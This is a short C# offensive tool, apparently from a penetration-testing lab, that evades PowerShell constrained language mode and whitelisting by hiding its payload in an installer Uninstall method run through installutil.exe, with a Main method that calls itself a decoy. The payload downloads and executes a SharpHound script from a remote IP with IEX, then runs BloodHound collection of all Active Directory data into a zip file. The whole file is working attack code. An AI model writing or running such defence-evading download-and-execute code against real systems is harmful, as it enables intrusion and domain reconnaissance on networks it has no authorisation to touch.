//This bypasses constrained language mode... 
//Run with C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /U
//This code will download sharphound and invoke the bloodhound method
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.98/sharphound.ps1')";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd).AddScript("Invoke-Bloodhound -CollectionMethod All -ZipFileName C:\\Windows\\Tasks\\bh.zip");
            ps.Invoke();
            rs.Close();
            
        }
    }
}
